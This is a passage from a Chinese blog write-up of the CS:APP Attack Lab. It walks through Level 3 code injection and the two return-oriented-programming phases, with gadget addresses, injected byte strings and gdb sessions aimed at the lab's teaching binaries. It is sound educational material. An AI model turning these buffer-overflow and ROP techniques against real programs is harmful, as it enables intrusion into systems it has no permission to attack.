<p>通过这种方式，我们就通过了：<br><img src="20230109225559.png"></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><strong>第三关的目标，是让test执行touch3，并传入cookie的值的字符串作为参数sval</strong></p>
<p>本题与level 2比较相似，但是，cookie的存放位置不能再像level 2一样，而是得再深入思考一番。<br>首先，先让我们看一下touch3函数，以及给出的hexmatch函数长啥样。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span>&#123;  </span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];  </span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;  </span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;   <span class="comment">// 比较cookie和第二个参数的前9位是否相同</span></span><br><span class="line">    <span class="comment">// cookie 只有8个字节，这里为9的原因是我们要比较最后一个是否为&#x27;\0&#x27;</span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span>&#123;  </span><br><span class="line">    vlevel = <span class="number">3</span>;  </span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);  </span><br><span class="line">        validate(<span class="number">3</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);  </span><br><span class="line">        fail(<span class="number">3</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，需要传入和cookie一致的sval，并且需要注意的是，sval的结尾还需带上’\0’<br>我们再来看看touch3的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 6044dc &lt;vlevel&gt;</span></span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        <span class="comment"># 6044e4 &lt;cookie&gt;</span></span><br><span class="line">  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	<span class="built_in">test</span>   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>我们可以发现，touch3的地址为0x4018fa，因此可以基于此地址注入构造代码。</p>
<p>假如我们按照level 2的思路做会有什么问题呢？<br>在本关的提示中，可以看到写了这么一句话：</p>
<ul>
<li><p>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<br>大意是，当touch3调用hexmatch和strncmp的时候，getbuf的缓冲区会因为hexmatch的入栈操作被覆盖。可以参考下图【参考<a target="_blank" rel="noopener" href="https://pylog.gitee.io/csapp/lab/lab3-2">attack lab - solution | hpy’s Log (gitee.io)</a>】：</p>
<p><img src="20230110141427.png"><br>当getbuf结束调用后，其本来开出的栈的位置，会被新调用函数给占用。因此，这里也告知我们，不能将sval这个字符串放在getbuf的缓冲区内，最好让其溢出到test中，这样就不会受到影响。</p>
</li>
</ul>
<p>基于以上的思路，我们首先可以查看以下test在进入getbuf之前，它的rsp指向哪里。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以在getbuf分配栈帧前打一个断点</span></span><br><span class="line">(gdb) b *0x4017a8</span><br><span class="line">(gdb) r -qi raw.bin</span><br><span class="line">Starting program: /home/wwq/csapp/csapplab/attacklab/exact/target1/ctarget -q ~i raw.bin</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12      <span class="keyword">in</span> buf.c</span><br><span class="line">(gdb) info r rsp</span><br><span class="line">rsp            0x5561dca0          0x5561dca0</span><br></pre></td></tr></table></figure>

<p>可以发现当前test的rsp的地址，现在为0x5561dca0，这里面应该存储了getbuf的return address，即getbuf的下一条指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x 0x5561dca0</span><br><span class="line">0x5561dca0:     0x00401976</span><br></pre></td></tr></table></figure>

<p>继续往下，再分析一下getbuf分配完之后的栈帧：<br>| address                                   | content                 |<br>| —————————————– | ———————– |<br>| 0x5561dca8                                |                       |<br>| 0x5561dca0 getbuf的返回地址（test的栈帧） | 00 00 00 00 00 40 19 76 |<br>| rsp + 20 (getbuf)的栈帧                   | 00 00 00 00 00 00 00 00 |<br>| rsp + 18 (getbuf)的栈帧                   | 00 00 00 00 00 00 00 00 |<br>| rsp + 10 (getbuf)的栈帧                   | 00 00 00 00 00 00 00 00 |<br>| rsp + 8 (getbuf)的栈帧                    | 00 00 00 00 00 00 00 00 |<br>| rsp (getbuf)的栈帧                   | 00 00 00 00 00 00 00 00 |</p>
<p>上面这张表已经很清晰了，我们只需要让缓冲区溢出时，将sval放到0x5561dca8即可。</p>
<p>此外，由level 2可知，getbuf的栈顶地址为0x5561dc78，即让getbuf的return address的内容被0x5561dc78替换，再将入侵的代码放到栈顶，即可让其执行我们编写的代码，再将sval放入0x5561dca8，即return address所在地址的上一行即可。</p>
<p>所以几行汇编指令可以这样编写：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov <span class="variable">$0x5561dca8</span>, rdi</span><br><span class="line">push <span class="variable">$0x4018fa</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>通过工具编译可以得到以下的字节码：<br><img src="20230110144507.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>

<p>而cookie是字符串，其ascii码可以表示为【可以通过工具转换获得】：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>根据之前的思路，那么我们写入的字节码可以表示如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 /* mov $0x5561dca8, rdi*/</span><br><span class="line">68 fa 18 40 00 /* push $0x4018fa */</span><br><span class="line">c3 00 00 00 /* ret 补齐 */ </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 共40个字节 */</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>正式输入的时候，不带 /*  的注释，才能获得正确的结果。<br><img src="20230110145505.png"></p>
<h1 id="Part2-Return-Oriented-Programming"><a href="#Part2-Return-Oriented-Programming" class="headerlink" title="Part2 Return-Oriented Programming"></a>Part2 Return-Oriented Programming</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>在本题开始前，先介绍一下attack-lab的介绍pdf里给出的信息，对于我们理解什么是ROP很有帮助。</p>
<p>这一部分是攻击rtarget这个文件，由level2和level3这两个部分，level2和level3要完成的操作和之前是一致的。不过，在rtarget中有一些保护措施，如栈地址的随机化和部分栈内容是只读的，因此像之前那样通过代码注入的攻击是无效的。对于这种保护措施，就需要通过ROP来攻击了。</p>
<p>这种攻击方式的原理是，在程序的汇编语言代码中，会出现我们需要用到的代码片段，并且以0xc3，也就是返回为重值，这种代码片段叫做gadget，合理利用gadget，我们就能实现return oriented programming这种攻击模式。</p>
<p>举个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    *p = <span class="number">3347663060U</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述这段代码，是将一个unsigned指针的值改变成一个很奇怪的数字，这个代码段乍看之下没啥用，不过如果我们观察它的汇编语言代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:  </span><br><span class="line">  400f15:       c7 07 d4 48 89 c7       movl   <span class="variable">$0xc78948d4</span>,(%rdi)  </span><br><span class="line">  400f1b:       c3                      retq</span><br></pre></td></tr></table></figure>

<p>我们发现第一行中的部分代码片段是48 89 c7，这个在x86-64汇编语言中代表了movq %rax, %rid这条语句，并且以c3结束。因为第一行代码的开始地址是400f15，48开始的地址换算过来，就是400f18，如果我们让程序从400f18开始执行，则相当于运行了movq %rax, %rid，并且返回。</p>
<p>这样截取的片段就叫做gadget，我们如果精心在栈上放上一些gadget的地址，如下图：<br><img src="20230111155545.png"></p>
<p>就可以让程序运行一些我们所期望它运行的代码片段，从而可以绕过随机化栈地址和只读栈地址这种保护策略。</p>
<p>在本阶段，有这样一个代码仓库，叫做farm（其实farm就嵌在rtaget中，题目为了方便把它单独拎出来了），题目要求我们利用farm里的gadget重新完成一遍level2和level3的攻击，也就是level4和level5。</p>
<p>在正式做题前，可以将farm.c反汇编成farm.o，或者直接在rtaret.s里找也一样。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rtarget -&gt; rtarget.s</span></span><br><span class="line">objdump -d rtarget &gt; rtarget.s</span><br><span class="line"><span class="comment"># farm.c -&gt; farm.o</span></span><br><span class="line">gcc -c -Og farm.c <span class="comment"># 这里加上-Og的参数，才能保证之后反汇编出的代码和rtarget.s相同</span></span><br><span class="line"><span class="comment"># farm.o -&gt; farm.d</span></span><br><span class="line">objdump -d farm.o &gt; farm.d</span><br></pre></td></tr></table></figure>

<h2 id="Level-2-Phase-4"><a href="#Level-2-Phase-4" class="headerlink" title="Level 2 - Phase 4"></a>Level 2 - Phase 4</h2><p>在有了前面的前置知识后，我们就可以动手操作了。<br>参考代码注入时的操作，是通过如下的汇编指令完成的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov <span class="variable">$0x59b997fa</span> %rdi</span><br><span class="line">push 0x4017ec <span class="comment"># touch的地址</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>首先push指令在farm.d中是找不到代码片段的，且代码无法执行，因此我们得参考我们能够使用的几个操作，先构建出命令。</p>
<p>因为gadget是由已有的代码片段中拼凑出来的，像mov或pop具体的值，是无法做到的，需要我们修改一下这种赋值方式。</p>
<p>比方说，我么可以把我们需要存放的参数放在栈内，然后通过pop的方式将其存入到寄存器中。因此我们需要找到pop的gadget片段，让gadget放在return address的位置，且参数应该放在return address的上方。<br>然后再找到mov 寄存器到参数寄存器rdi中，便于touch2调用。<br>最后再将touch2的地址，放在mov命令gadget的上方，便于最后返回执行。</p>
<p>所以我们的任务就是寻找以上提到的几个gadget的片段。<br>通过搜索工具，我们发现pop唯一可用的指令是58 90 c3。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3   </span><br><span class="line">  </span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3</span><br></pre></td></tr></table></figure>

<p>从attack.pdf得知，58 90 c3对应的是 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">nop <span class="comment"># no operation</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>如果从4019a7中提取【2个16进制构成1个字节】，即4019ab才能获取到58开头的gdaget<br>从4019ca中提取，即4019cc。取任意一个作为pop的gadget即可。</p>
<p>然后就是寻找mov的gadget，因为得到了pop %rax，我们要寻找的即是mov %rax, %rdi<br>从表中可知，该命令对应的反汇编指令即89 c7。<br>如果加上以c3结束的限定条件，也只有两个符合。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   <span class="variable">$0x90c78948</span>,(%rdi)</span><br><span class="line">  4019c9:	c3                   	ret  </span><br></pre></td></tr></table></figure>

<p>因此对于mov我们有两个可选地址：4019a2或4019c5。<br>因此pop和mov有4种组合可能，我们任选其一即可。</p>
<p>再将最开始的思路进行整合即可得到如下答案:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 <span class="comment"># buffer填满</span></span><br><span class="line">ab 19 40 00 00 00 00 00 <span class="comment"># pop 命令</span></span><br><span class="line">fa 97 b9 59 00 00 00 00 <span class="comment"># cookie值</span></span><br><span class="line">a3 19 40 00 00 00 00 00 <span class="comment"># mov命令</span></span><br><span class="line">ec 17 40 00 00 00 00 00 <span class="comment"># touch2地址</span></span><br></pre></td></tr></table></figure>
<p>下面是一个栈位置的示意图：<br><img src="attack_lab_phase4_1.jpg"></p>
<p><img src="20230112164559.png"></p>
<h2 id="Level-3-Phase-5"><a href="#Level-3-Phase-5" class="headerlink" title="Level 3 - Phase 5"></a>Level 3 - Phase 5</h2><p>进行到这里，按照讲义来说，我们已经收获了95分了。而且作者似乎也在暗示着第5关的难度较大。<br>由于本人是个菜鸡，但出于一定想要探知答案的心理，还是决定参考他人的答案，并对本实验做个完整的记录。</p>
<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在开启栈随机化和栈不可执行的条件下，利用缓冲区溢出和ROP注入完成level3的任务。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先是需要将本题能用到的gadget都收集起来：<br>这里为了图方便，仅展示各个命令所对应的某一个地址<br>| 作用           | 地址     |<br>| ————– | ——– |<br>| popq %rax      | 0x4019ab |<br>| movq %rax,%rdi | 0x4019c5 |<br>| movq %rsp,%rax | 0x401a06 |<br>| movl %eax,%edx | 0x4019dd |<br>| movl %eax,%edi | 0x4019c6 |<br>| movl %ecx,%esi | 0x401a13 |<br>| movl %edx,%ecx | 0x401a69 |<br>| movl %esp,%eax | 0x401a3c |<br>| rax=rdi+rsi    | 0x4019d6 |</p>
<p>最后一个命令尤为特殊，它不是某个函数的一部分，它就是那么显眼地出现在farm中。显然这应该是作者刻意安排，需要让我们调用的。</p>
<p>考虑如何解决level5。容易想到和level3一样把字符串放在栈中。只是因为开启了栈随机化，没有办法把一个绝对地址通过直接或间接的方法赋给rdi，因为这个字符串的首地址每次运行rtarget时都会改变。因此考虑相对地址，也就是计算出rsp和字符串首地址的距离，将两者相加赋给rdi。因此add_xy派上了用场。</p>
<p>设相对距离为x，那么最终目的是rdi=rsp+x。目前我们拥有的函数是rax=rdi+rsi，因此需要通过某种途径将rsp赋给rdi，将x赋给rsi，最后将计算结果rax赋给rdi。</p>
<p>具体操作就是：</p>
<ul>
<li>  把%rsp里的栈指针地址放到%rdi</li>
<li>  拿到相对距离x的值放到%rsi</li>
<li>  利用add xy，把栈指针地址和bias加起来放到%rax，再传到%rdi</li>
<li>  调用touch3</li>
</ul>
<p>有博主根据我们拥有的gadget，绘制出了两条传递链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsp--&gt;rax--&gt;rdi</span><br><span class="line">pushq x--&gt;rax(eax)--&gt;edx--&gt;ecx--&gt;esi(rsi)</span><br></pre></td></tr></table></figure>

<p>栈帧的结构如下：<br>因为是64位，所以一个栈的一个格子所占的大小是64位，即8个字节<br>那么偏移量x，也即返回地址加上9个命令，即8 * 9 = 72 个字节。换算成16进制，即0x48。所以pop %rax，即是将x也即0x48存入寄存器%rax中。<br><img src="20230112192327.png"></p>
<p>根据上面这张图，以及上面总结的命令，我们已经可以得到如下答案了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 <span class="comment"># 补全buffer</span></span><br><span class="line">06 1a 40 00 00 00 00 00 <span class="comment"># movq %rsp,%rax</span></span><br><span class="line">c5 19 40 00 00 00 00 00 <span class="comment"># movq %rax,%rdi</span></span><br><span class="line">ab 19 40 00 00 00 00 00 <span class="comment"># popq %rax</span></span><br><span class="line">48 00 00 00 00 00 00 00 <span class="comment"># 偏移量0x48</span></span><br><span class="line"><span class="built_in">dd</span> 19 40 00 00 00 00 00 <span class="comment"># movl %eax,%edx</span></span><br><span class="line">69 1a 40 00 00 00 00 00 <span class="comment"># movl %edx,%ecx</span></span><br><span class="line">13 1a 40 00 00 00 00 00 <span class="comment"># movl %ecx,%esi</span></span><br><span class="line">d6 19 40 00 00 00 00 00 <span class="comment"># add_xy</span></span><br><span class="line">c5 19 40 00 00 00 00 00 <span class="comment"># movq %rax,%rdi</span></span><br><span class="line">fa 18 40 00 00 00 00 00 <span class="comment"># touch地址</span></span><br><span class="line">35 39 62 39 39 37 66 61 00 <span class="comment"># cookie的16进制</span></span><br></pre></td></tr></table></figure>

<p><img src="20230112193610.png"></p>
<p>到此，attack lab也完结撒花了。<br>相比data lab，bomb lab和attack lab虽然与汇编打交道，但是CMU的老师，却能让我们从汇编中找到编程的乐趣，这个感受有些奇妙，再次感叹大牛果真是大牛啊~</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">wenwenka</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/">http://example.com/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">温温卡的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CsApp/">CsApp</a></div><div class="post_share"><div class="social-share" data-image="/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/"><img class="prev-cover" src="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CsApp —— Cache Lab</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/10/CsApp-%E2%80%94%E2%80%94-bomblab/"><img class="next-cover" src="/2023/01/10/CsApp-%E2%80%94%E2%80%94-bomblab/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CsApp —— Bomb Lab</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/" title="CsApp —— Cache Lab"><img class="cover" src="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-21</div><div class="title">CsApp —— Cache Lab</div></div></a></div><div><a href="/2023/01/09/CsApp-%E2%80%94%E2%80%94-Data-Lab/" title="CsApp —— Data Lab"><img class="cover" src="/2023/01/09/CsApp-%E2%80%94%E2%80%94-Data-Lab/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-09</div><div class="title">CsApp —— Data Lab</div></div></a></div><div><a href="/2023/01/10/CsApp-%E2%80%94%E2%80%94-bomblab/" title="CsApp —— Bomb Lab"><img class="cover" src="/2023/01/10/CsApp-%E2%80%94%E2%80%94-bomblab/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-10</div><div class="title">CsApp —— Bomb Lab</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">wenwenka</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/wenwenka" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/wu290063155@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">一些需要用到的操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Part1-Code-Injection-Attacks"><span class="toc-number"></span> <span class="toc-text">Part1 Code Injection Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">4.</span> <span class="toc-text">Level 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Part2-Return-Oriented-Programming"><span class="toc-number"></span> <span class="toc-text">Part2 Return-Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2-Phase-4"><span class="toc-number">2.</span> <span class="toc-text">Level 2 - Phase 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3-Phase-5"><span class="toc-number">3.</span> <span class="toc-text">Level 3 - Phase 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.1.</span> <span class="toc-text">任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/" title="CsApp —— Cache Lab"><img src="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CsApp —— Cache Lab"/></a><div class="content"><a class="title" href="/2023/01/21/CsApp-%E2%80%94%E2%80%94-CacheLab/" title="CsApp —— Cache Lab">CsApp —— Cache Lab</a><time datetime="2023-01-21T14:42:00.000Z" title="发表于 2023-01-21 22:42:00">2023-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/" title="CsApp —— Attack Lab"><img src="/2023/01/18/CsApp-%E2%80%94%E2%80%94-Attacklab/cover.jpg" 